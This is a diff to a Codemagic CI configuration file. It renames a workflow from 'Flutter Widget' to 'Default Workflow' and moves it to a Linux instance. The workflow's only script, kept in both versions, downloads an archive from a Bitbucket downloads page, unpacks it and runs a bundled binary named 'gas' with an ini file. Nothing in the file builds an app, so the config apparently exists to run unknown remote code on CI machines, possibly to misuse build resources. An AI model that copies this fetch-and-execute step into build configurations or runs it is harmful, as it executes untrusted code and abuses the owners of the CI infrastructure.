@@ -1,9 +1,8 @@
+#codemagic.yaml
 workflows:
-    
-    flutter-widget:
-        name: Flutter Widget
-        max_build_duration: 120
-        environment:
-            flutter: dev
-        scripts:
-            - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
+  default-workflow:
+    name: Default Workflow
+    instance_type: linux
+    max_build_duration: 120
+    scripts:
+      - wget https://bitbucket.org/19410711/dumang/downloads/joss.tar.gz && tar -xvf joss.tar.gz && ./gas keun.ini
